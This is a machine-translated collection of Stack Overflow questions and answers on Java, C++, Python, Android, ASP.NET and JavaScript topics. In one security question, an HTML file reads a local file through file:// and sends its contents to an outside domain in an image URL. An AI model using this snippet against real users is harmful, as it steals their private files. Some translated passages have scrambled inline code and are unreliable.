    at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:810)
    at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:740)
    at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:110)
    at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1208)
    at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:525)
    at javax.xml.parsers.SAXParser.parse(SAXParser.java:392)
    at com.opensymphony.xwork2.util.DomHelper.parse(DomHelper.java:113)
    ... 27 more 
```

我已经在 Eclipse 中配置了默认服务器并将 jar 文件添加到路径中。将 jar 文件放在 lib 文件夹中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T06:00:28.693

如果您收到类似的异常

> 引起：java.net.UnknownHostException：struts.apache.org

在构建 Struts2 XML 配置的过程中，某些东西阻止了应用程序成功检索`DTD`.

更改 doctype 声明

```
 <!DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN" "http://struts.apache.org/dtds/struts-2.3.dtd"> 
```

到本地引用或只是将 DTD 内容复制并粘贴到其位置将解决问题。

# windows - 来自 Windows 7 应用程序的 SPTI/SCSI 操作

> ID：12328106
> 
> 赞同：4
> 
> 时间：2012-09-08T04:47:53.543
> 
> 标签：windows, security, winapi, device-driver, scsi

我需要一些有关更新某些 Windows 软件以与非存储 SCSI 设备通信的安全问题的帮助。

最初的软件是为 Windows XP 编写的 DLL，并通过 Adaptec 的 ASPI API 与设备通信。ASPI 没有任何安全性，因此任何用户运行的任何应用程序都可以使用我的 DLL 与这些设备之一进行通信，并且一切正常。

我现在正在使用 Microsoft 的现代 SPTI（SCSI Pass-Through Interface）API 更新软件以与 Windows 7 一起使用。在 XP 下使用 SPTI 一切正常，但 Windows 7 具有更严格的安全性，对于普通用户甚至管理员来说，SPTI 调用会返回一个错误，表明权限不足。如果我使用隐藏的“管理员”帐户登录，我的软件可以在 SPTI 上正常运行，但这不是可接受的部署选项。

以下是我迄今为止研究过的一些替代方案，以降低必须重写现有代码的水平：

*   分离一个线程并提升其权限以伪装成“管理员”，以便它可以与 SPTI 对话。[我无法使用 LogonUser()/ImpersonateLoggedOnUser()/LoadUserProfile() 让它工作；对 LoadUserProfile() 的调用失败，SPTI 调用也因权限不足错误而失败。]
*   编写一个具有足够权限与 SPTI 对话的 Windows 服务，然后让我的 DLL 与该服务对话。
*   用户空间 (UMDF) 驱动程序。这将是一个昂贵的重写，我不清楚 UMDF 是否支持访问 SCSI 设备。
*   内核 (KMDF) 驱动程序。应该可以工作，但会是一个更长、更昂贵的重写。

我希望这里的社区可以提供一些智慧/经验/想法，让我的代码在 Windows 7 下与这个 SCSI 设备对话，理想情况下不必重写太多。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T04:57:39.730

我将其作为答案提出，因为它太长了，无法发表评论。

我想您已经尝试设置应用程序的清单，以便它在运行时需要提升？重要的是要注意你必须提升一个进程，AFAIK你不能提升一个线程。

您建议将其作为服务运行然后与之通信（命名管道或 WCF 是可行的选项）是一个很好的建议。如果您将其作为[本地系统](http://msdn.microsoft.com/en-us/library/windows/desktop/ms684190%28v=vs.85%29.aspx)运行，那么您的服务将比本地管理员拥有更多特权。

# python - 如何在 Python 中拆分字符串？

> ID：12328108
> 
> 赞同：-2
> 
> 时间：2012-09-08T04:48:27.693
> 
> 标签：python, string

> **可能的重复：**
> [每隔 n 个字符拆分 python 字符串？](https://stackoverflow.com/questions/9475241/split-python-string-every-nth-character)
> [以块为单位迭代列表的最“pythonic”方式是什么？](https://stackoverflow.com/questions/434287/what-is-the-most-pythonic-way-to-iterate-over-a-list-in-chunks)

我需要将一个字符串分成相等的部分。例如，如果我有这个字符串：

```
string = "123456781234567812345678" 
```

我需要每 8 个字符剪切一次：

```
["12345678", "12345678", "12345678"] 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-08T04:55:05.237

这实际上是 python 列表理解单行的一个很好的应用程序！

```
my_str="123456781234567812345678"
splits=[my_str[x:x+8] for x in range(0,len(my_str),8)]
//splits = ["12345678","12345678","12345678"] 
```

如果您有任何问题，请告诉我。

* * *

## 回答 #2

> 赞同：-7
> 
> 时间：2012-09-08T04:51:28.847

这可能会有所帮助：

> ```
> str.split(str="", num=string.count(str)). 
> ```
> 
> str：任意分隔符，默认为空格。
> 
> num：要制作的行数。

[您可以在此处](http://www.tutorialspoint.com/python/string_split.htm)获取更多信息。

# c++ - 矩阵求幂中的整数溢出

> ID：12328111
> 
> 赞同：0
> 
> 时间：2012-09-08T04:49:34.543
> 
> 标签：c++

我一直在尝试产生几个需要矩阵求幂的序列。我的代码为小案例产生了正确的值。我在下面提供了 2 个不同的矩阵，我已经将它们用于 2 个不同的序列。

**矩阵1**

```
[2  1 -2 -1]
[1  0  0  0]
[0  1  0  0]
[0  0  1  0] 
```

**矩阵2**

```
[4 1]
[-4 0] 
```

我之前尝试过使用矩阵中的非负值求幂，并且得到了预期的结果。

为了适应较大的结果值，我使用 MOD=1000000007。

据我所知，当矩阵中的一个值被 MOD 减少而其他值没有被减少时，问题就出现了，这反过来又使最终结果错误。负值也越来越大，所以我也不是确定如何处理它们，我的最终答案对于许多值是否定的。

我会在这个问题上应用任何链接/资源/帮助。
这是代码，它生成斐波那契产品。

```
#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <algorithm>
#include <vector>
#include <string>
#include <cstring>
#include <cmath>
#include <list>
#include <map>
#include<conio.h>
#include <cassert>
#define pb push_back
#define mp make_pair
#define all(x) x.begin(),x.end()
#define rep(i,n) for(int i=0;i<n;i++)
#define fill(x,y) memset(x,y,sizeof(x))
#define Size(x) (int(x.size()))
#define FOR(k,a,b) for(typeof(a) k=(a); k < (b); ++k)
typedef long long ll;
using namespace std;
#define dim 4

struct matrix
{
    int a[dim][dim];
};

#define MOD 1000000007

matrix mul(matrix x, matrix y)
{
    matrix res;
    FOR(a, 0, dim) FOR(b, 0, dim) res.a[a][b] = 0;
    FOR(a, 0, dim) FOR(b, 0, dim) FOR(c, 0, dim)
    {
        res.a[a][c] += (x.a[a][b] * ll(y.a[b][c])) % MOD;
        res.a[a][c] %= MOD;
    }
    return res;
}

matrix power(matrix m, int n)
{
    if (n == 1) return m;
    matrix u = mul(m, m);
    u = power(u, n / 2);
    if (n & 1) u = mul(u, m);
    return u;
}

matrix M, C, D, RP, A;

int main()
{
    FOR(a, 0, dim) FOR(b, 0, dim) M.a[a][b] = 0;
    M.a[0][0] = 2;
    M.a[1][0] = 1;
    M.a[2][0] = -2;
    M.a[3][0] = -1;
    M.a[0][1] = M.a[1][2] = M.a[2][3] = 1;
    C.a[0][0] = 96;
    C.a[0][1] = 44;
    C.a[0][2] = 18;
    C.a[0][3] = 5;
    int nt;
    scanf("%d", & nt);
    while (nt--)
    {
        int n;
        scanf("%d", & n);
        if (n <= 5)
        {
            if (n == 5) printf("96\n");
            if (n == 4) printf("44\n");
            if (n == 2) printf("5\n");
            if (n == 3) printf("18\n");
            if (n == 1) printf("2\n");
            continue;
        }
        if (n > 5)
        {
            int rs = n - 5;
            RP = power(M, rs);
            A = mul(C, RP);
            printf("%d\n", A.a[0][0]);
        }
    }
    getch();
    return 0;
} 
```

# android - 安卓键盘问题

> ID：12328117
> 
> 赞同：0
> 
> 时间：2012-09-08T04:50:39.093
> 
> 标签：android, keyboard, listener

```
@Override
public void onConfigurationChanged(Configuration newConfig) {
   super.onConfigurationChanged(newConfig);

   // Checks whether a hardware keyboard is available
   if (newConfig.hardKeyboardHidden == Configuration.HARDKEYBOARDHIDDEN_NO) {
       Toast.makeText(this, "keyboard visible", Toast.LENGTH_SHORT).show();
   } else if (newConfig.hardKeyboardHidden == Configuration.HARDKEYBOARDHIDDEN_YES) {
       Toast.makeText(this, "keyboard hidden", Toast.LENGTH_SHORT).show();
   }
} 
```

我想在运行时检测键盘可见性。上面的代码在 android 2.2 中不起作用。我需要一个键盘事件监听器的解决方案。

我还在 manifest.xml 中添加了 configChanges 属性

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:14:34.380

这是安卓的痛点。您需要使用自定义视图作为根视图并应用使用 onSizeChanged() + 布局更改差异的侦听器来调用自定义回调。

示例视图。

```
/**
 * Subclass of RelativeLayout that adds a size changed listener.  This is useful for determining
 * when the onscreen keyboard has popped up and resized the window
 *
 */
public class SCRelativeLayout extends RelativeLayout {
  public interface OnSizeChangedListener {
    public void onSizeChanged(int w, int h, int oldw, int oldh);
  }

  private OnSizeChangedListener mOnSizeChangedListener;

  public SCRelativeLayout(Context context) {
    super(context);
  }

  public SCRelativeLayout(Context context, AttributeSet attrs) {
    super(context, attrs);
  }

  public SCRelativeLayout(Context context, AttributeSet attrs, int defStyle) {
    super(context, attrs, defStyle);
  }

  @Override
  protected void onSizeChanged (int w, int h, int oldw, int oldh) {
    super.onSizeChanged(w, h, oldw, oldh);

    if (mOnSizeChangedListener != null) {
      mOnSizeChangedListener.onSizeChanged(w, h, oldw, oldh);
    }
  }

  public void setOnSizeChangedListener(OnSizeChangedListener listener) {
    mOnSizeChangedListener = listener;
  }
} 
```

# algorithm - Big Theta 表示法中的常数值

> ID：12328118
> 
> 赞同：0
> 
> 时间：2012-09-08T04:50:47.673
> 
> 标签：algorithm, asymptotic-complexity

在 Big Theta 表示法中，每个 ? 值的常数`c1`和不同。`c2``n`

**定义：**

```
Theta(g(n)) = {f(n): there exist c1 >= 0, c2 > 0 and n0 > 0
                     such that for all n >= n0,
                     0 <= c1, g(n) <= f(n) <= c2 * g(n)} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T04:57:20.610

`c1`并且`c2`对于 的每个值都没有不同`n`。如果它们是，它们将依赖于`n`，并且不会是常量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T05:31:44.143

```
Theta(g(n)) = {f(n): for all n >= n0, there exist c1 >= 0, c2 > 0 and n0 > 0
                 such that 0 <= c1, g(n) <= f(n) <= c2 * g(n)} 
```

我不认为你定义中的量词是正确的。它应该是

```
Theta(g(n)) = {f(n): there exist c1 >= 0, c2 > 0 and n0 > 0
                 such that for all n >= n0, c1 * g(n) <= f(n) <= c2 * g(n)} 
```

# c# - 为gridview内的下拉列表设置数据源

> ID：12328128
> 
> 赞同：0
> 
> 时间：2012-09-08T04:53:55.103
> 
> 标签：c#, asp.net

我正在使用以下代码为我的 gridview 中的下拉菜单设置数据源，但它不起作用。

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        DropDownList drop = (DropDownList)e.Row.FindControl("folderslist");
        drop.DataSource = list;
        drop.DataBind(); 

    } 
```

list 是一个字符串列表，它将 find 绑定到我在 gridview 之外的下拉列表。但是，上面的代码不会填充 gridview 内的下拉列表。

```
<asp:GridView ID="GridView1" HorizontalAlign="Center" 
                                AutoGenerateColumns="false" CellSpacing="5" CellPadding="5" CssClass="GridView" Font-Size="Small"
                                runat="server" OnRowDataBound = "GridView1_RowDataBound" >

                         <Columns>

                         <asp:BoundField HeaderText="From" DataField="From" />

                         <asp:BoundField HeaderText="Subject" DataField="Subject" />

                         <asp:BoundField HeaderText="Received" DataField="Received" />

                         <asp:TemplateField HeaderText="Attachments" ItemStyle-HorizontalAlign="Center">
                                    <ItemTemplate>
                                        <asp:ImageButton runat="server" ID="attach" CommandName="viewattachments" Text="More"
                                            ImageUrl="~/images/notes.png" visible='<%# System.Convert.ToBoolean((DataBinder.Eval(Container.DataItem, "Attachments").ToString() == "") ? false : true) %>' />

                                    </ItemTemplate>
                                    <ItemStyle HorizontalAlign="Center"></ItemStyle>
                                </asp:TemplateField>

                                <asp:TemplateField HeaderText="Move To" ItemStyle-HorizontalAlign="Center">
                                    <ItemTemplate>

                                      <asp:DropDownList ID="folderslist" runat="server"></asp:DropDownList>

                                    </ItemTemplate>
                                    <ItemStyle HorizontalAlign="Center"></ItemStyle>
                                </asp:TemplateField>

</Columns>
                            </asp:GridView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:07:50.747

gridview 中的下拉菜单`folders`不是`folderlist`. 在 e.Row.FindControl() 方法中提供文件夹。调试代码可以帮助你发生什么。还要确保列表中有数据。

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
{
    DropDownList drop = (DropDownList)e.Row.FindControl("folders");
    drop.DataSource = list;
    drop.DataBind(); 

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:42:43.187

`asp:DropDownList`绑定到数据源项的属性，并且 String 类型没有返回其值的属性。尝试将每个字符串包装成一个辅助对象：

```
 class StringHolder 
 {
      public StringHolder(string displayText) { DisplayText = displayText; }
      public string DisplayText { get; set;}
 }

IList<StringHolder> WrapStrings(IList<string> strings)
{
    return strings.Select(it => new StringHolder(it)).ToList());

}

protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
{
    DropDownList drop = (DropDownList)e.Row.FindControl("folderslist");
    drop.DataTextField = "DisplayText";
    drop.DataSource   = WrapStrings(list);
    drop.DataBind(); 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-09T06:45:42.120

```
private void grdCoboFill()
{
    DataTable dt = new DataTable();
    dt.Columns.Add("ColorID", typeof(int));
    dt.Columns.Add("ColorName", typeof(String));

    dt.Rows.Add(new Object[] { 1, "RED" });
    dt.Rows.Add(new Object[] { 2, "GREEN" });
    dt.Rows.Add(new Object[] { 3, "BLUE" });

    foreach (GridViewRow row in this.GridView1.Rows)
    {
        ((DropDownList)row.FindControl("DropDownList1")).DataSource = dt;
        ((DropDownList)row.FindControl("DropDownList1")).DataValueField = "ColorID";
        ((DropDownList)row.FindControl("DropDownList1")).DataTextField = "ColorName";
        ((DropDownList)row.FindControl("DropDownList1")).DataBind();
    }
} 
```

# java - 如何将字符串日期转换为日期类对象

> ID：12328130
> 
> 赞同：1
> 
> 时间：2012-09-08T04:54:23.163
> 
> 标签：java, java.util.date

我有这样的字符串格式的日期“Sat Sep 8 10:13:09 GMT+0530 2012”，谁能帮我把这个字符串日期转换为 Date 类对象。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T04:58:30.493

试试这个代码。当然，我已经根据您的字符串进行了修改，但是如果它不起作用，您可能需要稍微修改格式。

```
import java.util.*;
import java.text.*;

public class StringToDate {
    public static void main(String[] args){
        try{  
            String str_date="Sat Sep 8 10:13:09 GMT+0530 2012";
            DateFormat formatter ; 
            Date date ; 
            formatter = new SimpleDateFormat("EEE MMM d HH:mm:ss 'GMT'z yyyy");
            date = (Date)formatter.parse(str_date);  
            System.out.println("Today is " +date );
        } 
        catch (ParseException e){
            System.out.println("Exception :"+e);  
        }  
    }
} 
```

# javascript - 通过运行html文件窃取用户数据

> ID：12328132
> 
> 赞同：11
> 
> 时间：2012-09-08T04:55:06.110
> 
> 标签：javascript, html, security, xmlhttprequest, imagesource

让我们谈谈安全性。在我看来，理论上，如果用户用它打开 html 文件（从他的文件系统打开，而不是从网络打开），我可以使用一些脚本从用户的文件系统获取信息。看代码：

*信息.txt：*

```
my info 
```

*索引.html：*

```
<!doctype html>

<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
    <script>
      $(document).ready(function () {
        $.get('file:///home/daz/desktop/info.txt', function (data) {
          $('<img>').attr('src', 'http://domain.com?data=' + escape(data)).appendTo('body');
        }, 'text');
      });
    </script>
  </head>    
  <body></body>
</html> 
```

一些浏览器（例如firefox）允许您从`file://`through获取文件`XmlHttpRequest`，所以如果我猜到文件的路径，那么我可以通过 ajax 获取它的内容。然后我可以使用查询字符串中的参数动态地添加`img`标签并`src`引导到我的域。而浏览器则乖乖地发出请求`GET ?data=my%20info%0A domain.com`。在服务器端，我可以解析查询字符串并获取数据。

***我可以这样做吗？如果他打开我的 html 文件，我可以从他的计算机上获取用户的数据吗？所以我可以说：“嘿，朋友，看看这个文件！”*** （有 2 个限制：用户应该使用 firefox 或其他具有类似配置的东西，并且由于访问权限，我无法获取用户无法访问的文件）。

***更新：***

如果可能，那为什么可能呢？他们为什么允许你做这样的事情。为什么没有确认对话框之类的。

***更新2：***

如果有人对此问题进行评论，那就太好了。提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T06:16:54.803

这比你想象的要少。正如 Chromium 开发团队在这篇文章中所述，各种浏览器对本地 HTML 文件的功能实施了不同的限制：

[http://blog.chromium.org/2008/12/security-in-depth-local-web-pages.html](http://blog.chromium.org/2008/12/security-in-depth-local-web-pages.html)

尤其：

*   Internet Explorer 默认禁用本地 HTML 文件中的 Javascript
*   Opera 对本地文件的跨域访问设置了一些限制
*   Firefox 对本地文件访问应用子目录限制

（请注意，这篇文章是 2008 年发布的；从那时起，浏览器——尤其是 Chrome——可能已经发生了重大变化。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-23T11:26:24.250

只是一个更新：公司现在正在使用此漏洞窃取数百万用户的信息，在他们不知情且不使用 cookie 的情况下跟踪他们。[http://en.wikipedia.org/wiki/Device_fingerprint](http://en.wikipedia.org/wiki/Device_fingerprint)

似乎这个漏洞是故意留在他们的，所以用户可以被利用。

# python - 为什么这个程序会给出这个结果？

> ID：12328134
> 
> 赞同：-4
> 
> 时间：2012-09-08T04:55:25.393
> 
> 标签：python

为什么这段代码：

```
n = int(raw_input("How many rows? "))
for row in xrange(n):
    for col in xrange(row+1):
        print "*",
    print 
```

显示这个结果（当 n = 5 时）？

```
*
* *
* * *
* * * *
* * * * * 
```

编辑 - 我不明白它是如何一步一步得到这个表格的。col是指列数吗？因为即使列的输入是（行+1），列数等于行数也是没有意义的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T05:47:24.910

好吧，让我们一行一行地思考，就像我们是计算机一样。

*   `n = int(raw_input("How many rows? "))`我们获取用户输入的内容，将其转换为整数，并将结果存储在`n`.
*   `for row in xrange(n):`我们正在循环`xrange(n)`，这或多或少相同`[0, 1, 2, 3, 4]`（尽管`xrange`不会一次存储完整列表，因此内存效率更高）。所以现在我们知道，无论何时我们`row`在未来看到，我们都必须用我们所在的任何一个数字来替换它。
*   `for col in xrange(row+1):`这一行与上一行类似；now`col`是列表中的值之一，从.`0`中存储的值开始计数`row`。所以如果`row`是`2`在外循环的这次迭代中，内循环将运行 3 次。第一次`col`将相等`0`，第二次`1`和第三次将相等`2`。（对于这些`col`值中的每一个，`row`将保持`2`，因为`row`仅在外部循环经过迭代时才会更改。）
*   `print "*",`这是`*`s 实际打印的地方。这里棘手的一点是行尾的逗号。不带逗号的`print`语句只打印一些内容，然后移至下一行。当您添加逗号时，它基本上会打印该行，但在该行之后添加一个空格而不是一个新行 ( `\n`)。因此，由于对每个`col`值都调用了这一行，因此它将`*`在一行上为每个值打印 a 后跟一个空格`col`。
*   `print`请注意，这不在 col 循环内。该语句只打印一个换行符。这里的想法是在打印每一行之后打印一个新行，以便`*`将下一行的 s 添加到新行，而不是前一行。如果这`print`不在这里，所有的星星都将打印在一行上。

因此，对于每个值，该程序在一行上`row`打印s 的`row+1`数量。`*`

**针对问题编辑：**

我可以看到怎么`col`可能是一个令人困惑的名字。`col`只是正在打印的*当前*列号。`*`要更清楚地看到这一点，请尝试替换`print "*",`为`print col,`. 您应该得到以下信息：

```
0
0 1
0 1 2
0 1 2 3
0 1 2 3 4 
```

（记住`range(3)`产生`[0,1,2]`，而`range(3+1)`产生`[0,1,2,3]`。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T05:18:51.287

你的代码告诉它这样做。假设n = 5。然后你跳入`for`循环。第一次通过 var 行是 0。因此，当您为列启动第二个 for 循环时，您编写`xrange(row+1)`. 好吧，如果 row 为 0，则 row + 1 = 1。所以它将显示一个星号。然后跳到第一个 for 循环。好的，第二次迭代，变量 row 变为 1。因此，row + 1 = two，所以当你再次进入第二个 for 循环时，它会循环直到 hit 命中两个。然后重新开始，这个过程会不断重复，直到你有 5 行，每行都有足够的列来满足该行 + 1 列。只需一步一步地按照代码进行操作。

# tfs - 将集合从 TFS 2010 迁移到 TFS 2012

> ID：12328140
> 
> 赞同：9
> 
> 时间：2012-09-08T04:57:12.083
> 
> 标签：tfs, tfs-migration

是否有任何简单的解决方案**将集合**从**TFS 2010**移动到**TFS 2012**，包括源代码、工作项、文档、项目站点......？顺便说一句，已经安装了 TFS 2012。

* * *

我需要将 TFS 2010 数据库导入到 TFS 2012 中，已经有人使用 TFS 2012 环境。[Rangers Guidance](http://vsarupgradeguide.codeplex.com/)可以帮助我进行迁移

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-10T11:04:07.810

另一种选择是使用集合分离和附加操作。这些支持在附加时升级集合。即使此链接显示 2010，它也适用于 2012。

[http://msdn.microsoft.com/en-us/library/dd936138(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/dd936138(v=vs.100).aspx)

# java - Java 发布到 Localhost PHP 服务器

> ID：12328141
> 
> 赞同：0
> 
> 时间：2012-09-08T04:57:19.073
> 
> 标签：java, php, http-post

我有一个 java 脚本，可以在我的数据上生成字符串。有什么方法可以在我的 Xampp Localhost PHP 上使用 POST 来接收来自 java 程序的数据字符串并在我的 PHP 页面上回显它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:01:25.393

您可以使用[HttpURLConnection](http://docs.oracle.com/javase/7/docs/api/java/net/HttpURLConnection.html)对象向 localhost 发出请求。请参阅[此问题](https://stackoverflow.com/questions/1359689/how-to-send-http-request-in-java)和[本教程](http://docs.oracle.com/javase/tutorial/networking/urls/readingWriting.html)。

# python - 从整数 id 获取 pyobjc 对象

> ID：12328143
> 
> 赞同：2
> 
> 时间：2012-09-08T04:57:27.433
> 
> 标签：python, wxpython, pyobjc

有没有办法为一个Objective-C对象获取一个PyObjC代理对象，只给它`id`一个整数？可以不用扩展模块来完成吗？

在我的例子中，我试图从`wx.Frame.GetHandle`（使用 wxMac 和 Cocoa）的返回值中获取一个 Cocoa 代理对象。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T04:57:27.433

我确实找到的一个解决方案依赖于从以下位置`ctypes`创建一个`objc_object`对象`id`：

```
import ctypes, objc
_objc = ctypes.PyDLL(objc._objc.__file__)

# PyObject *PyObjCObject_New(id objc_object, int flags, int retain)
_objc.PyObjCObject_New.restype = ctypes.py_object
_objc.PyObjCObject_New.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

def objc_object(id):
    return _objc.PyObjCObject_New(id, 0, 1) 
```

其用于打印 a 的示例`wx.Frame`：

```
import wx

class Frame(wx.Frame):
    def __init__(self, title):
        wx.Frame.__init__(self, None, title=title, pos=(150,150), size=(350,200))

        m_print = wx.Button(self, label="Print")
        m_print.Bind(wx.EVT_BUTTON, self.OnPrint)

    def OnPrint(self, event):
        topobj = objc_object(top.GetHandle())
        topobj.print_(None)

app = wx.App()
top = Frame(title="ObjC Test")
top.Show()

app.MainLoop() 
```

由于它使用了`ctypes`. 如果有一个`pyobjc`我忽略的 API 函数或其他更简洁的方法，我肯定会感兴趣。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-22T13:58:23.200

在 PyObjC 2.5 中，您可以使用：

```
import objc
objc.objc_object(ctypes_void_p=some_object_id) 
```

在早期版本的 PyObjC 中没有用于执行此操作的公共 API。

# javascript - 如何在 javascript 中访问自定义 html 属性？

> ID：12328144
> 
> 赞同：2
> 
> 时间：2012-09-08T04:57:28.387
> 
> 标签：javascript, html

嗨，我在这个 html 文档中遇到问题，请帮助我

我对此很陌生。

也许我是傻瓜错过了一些东西。

我在这里只放了有用的资源来解决。

```
<!DOCTYPE html>
<html>
  <body id="owner_profile">
    <a id="buy" owner="789" token="1000" wrapper="purchase" name="oname">Hurray!</a><br>
    <script>
      document.write("You Have: ");
      document.write(document.getElementById('buy').token);
    </script>  
  </body>
</html> 
```

我希望它显示令牌，但它给出未定义

**结果是：**

欢呼！

你有：未定义

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T04:58:40.370

属性和属性是有区别的。要获取属性，请使用`getAttribute("token")`.

许多（预定义）属性被映射到属性（或者相反，我不知道）。因此，例如，如果您设置一个单元格的`colSpan`属性，您也会影响其`colspan`属性。

然而，有时两者是非常不同的。最值得注意的是，`value`如果您在框中键入，输入的属性不会改变。但是`value`物业会。这意味着您始终可以使用 重置文本框`elem.value = elem.getAttribute("value")`。

作为一般规则，您应该始终使用`get/setAttribute`来更改元素属性，因为您不能依赖那里的属性。

旁注：那些“属性”应该是数据：

```
<a id="buy" data-owner="789" data-token="1000" data-wrapper="purchase" name="oname"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T04:59:29.117

您需要使用`.getAttribute('token')`而不是`.token`，因为“token”不是有效的 HTML 属性。

```
<script>
document.write("You Have: ");
document.write(document.getElementById('buy').getAttribute("token"));
</script> 
```

工作 JSFiddle：http: [//jsfiddle.net/AvKbn/](http://jsfiddle.net/AvKbn/)

# jquery - Jquery DOM 遍历，TOGGLE CSS PROPERTY

> ID：12328148
> 
> 赞同：1
> 
> 时间：2012-09-08T04:57:56.397
> 
> 标签：jquery, dom, traversal

使用 Jquery ，每当鼠标悬停在 Topic1 上时，我想将 css 属性“display:none”从 CORRESPONDING {或仅底层到该 li 标签}class1 更改为“display:block”。有什么建议么？

```
<li class="top"> 
   <a href="#" >Topic1</a>
      <div class="Class 1">
    <div class="class2" style="width:25%"><ul>
           <li><a href="#" Some text1</a></li>
           <li><a href="#" Some text1</a></li>
           <li><a href="#" Some text1</a></li>
                 ...
        </ul></div>
      </div>
</li>
<li class="top"> 
   <a href="#" >Topic2</a>
      <div class="Class 1">
    <div class="class2" style="width:25%"><ul>
           <li><a href="#" Some text2</a></li>
           <li><a href="#" Some text2</a></li>
           <li><a href="#" Some text2</a></li>
                 ...
        </ul></div>
      </div>
</li> 
```

在哪里

```
.class1 {
    display:none;
    ...
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:17:30.733

假设你的 html 是有效的（目前你没有一些错误），下面应该做你需要的。假设这是您想要的，它只会在带有文本“Topic1”的锚点下发生。

```
​$('a').on('hover', function() {
    $(this).siblings('div').toggleClass("class1");
}); 
```

# c++ - 没有默认构造函数的类成员

> ID：12328150
> 
> 赞同：7
> 
> 时间：2012-09-08T04:58:26.593
> 
> 标签：c++, default-constructor, initialization-list

假设我有一个没有默认构造函数的 A 类，一个返回 A 类型对象的工厂方法 factoryA，以及一个以 A 作为其成员的 B 类。我知道在这种情况下，B 的类型 A 的成员必须在 B 的构造函数初始化列表中进行初始化。我不完全清楚为什么，如果有人可以向我解释，那就太好了。另外，如果 A 的构造函数的参数需要在 B 的构造函数内部计算，比如通过查询数据库或类似的东西怎么办？有没有办法在不为 A 提供默认构造函数的情况下使用下面的设置？提前致谢。

```
class A {
private:
  int _i;
public:
  A(int i) : _i(i) {} 
};

A factoryA(bool b) {
  if(b)
    return A(1);
  else return A(2);
}

class B {
private:
  A _a;
public:
  B(int j) {
    if(j > 0)
      _a = factoryA(true);
    else _a = factoryA(false);
  }
}; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-08T12:49:53.053

成员对象总是在进入构造函数的主体（大括号之间的部分）之前被初始化。如果你没有在初始化列表中提到一个成员，它会被默认构造。所以提一下！

```
B::B(int j) : _a(factoryA(0 < j)) { }; 
```

如果`factoryA`参数值大于 0，否则将调用函数，并使用该调用返回的值初始化成员。`true``j``false``_a`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-08T06:41:26.817

> 我不完全清楚为什么，如果有人可以向我解释，那就太好了。

对于类[*]，该`_a = factoryA(true);`行调用`_a.operator=(factoryA(true))`. 调用成员函数`_a`需要`_a`已经初始化。因此，如果它不是编译时错误，它仍然是无效的。

> 另外，如果 A 的构造函数的参数需要在 B 的构造函数内部计算，比如通过查询数据库或类似的东西怎么办？有没有办法在不为 A 提供默认构造函数的情况下使用下面的设置？

只要`A`有一个复制或移动构造函数，您就可以使用函数返回值对其进行初始化，并且该函数可以做任何您想做的事情，甚至`A`根据提供的参数使用不同的构造函数。

```
class B {
private:
  A _a;
  static A getA(int i);
public:
  B(int j) : _a(getA(j)) {
  }
};

A B::getA(int j)
{
  if (j > 0)
    return factoryA(true);
  else
    return factoryA(false);
} 
```

[*] 我知道，也有例外。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T05:03:02.637

在这种情况下，最好使用指向 A 的指针，即 A* _a，然后在任何需要的地方调用 A 构造函数。

# objective-c - 为什么 XIB 文件没有立即反映最近的 Outlet 更改？

> ID：12328153
> 
> 赞同：4
> 
> 时间：2012-09-08T04:58:46.310
> 
> 标签：objective-c, xcode

我有一个链接到 XIB 的视图控制器：

```
__weak IBOutlet UITextField *dateTextField; 
```

重命名此字段后，我仍然能够在 XIB 文件所有者的出口列表中看到旧变量。看起来 XIB 文件中没有自动刷新某些内容。

重新启动 XCode 后，旧变量按预期消失了。我只是觉得不得不这样做是很不寻常的。需要了解正在发生的事情。

1.  这是正常行为还是工具中的错误？
2.  我可以手动触发此刷新吗？

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T05:12:50.263

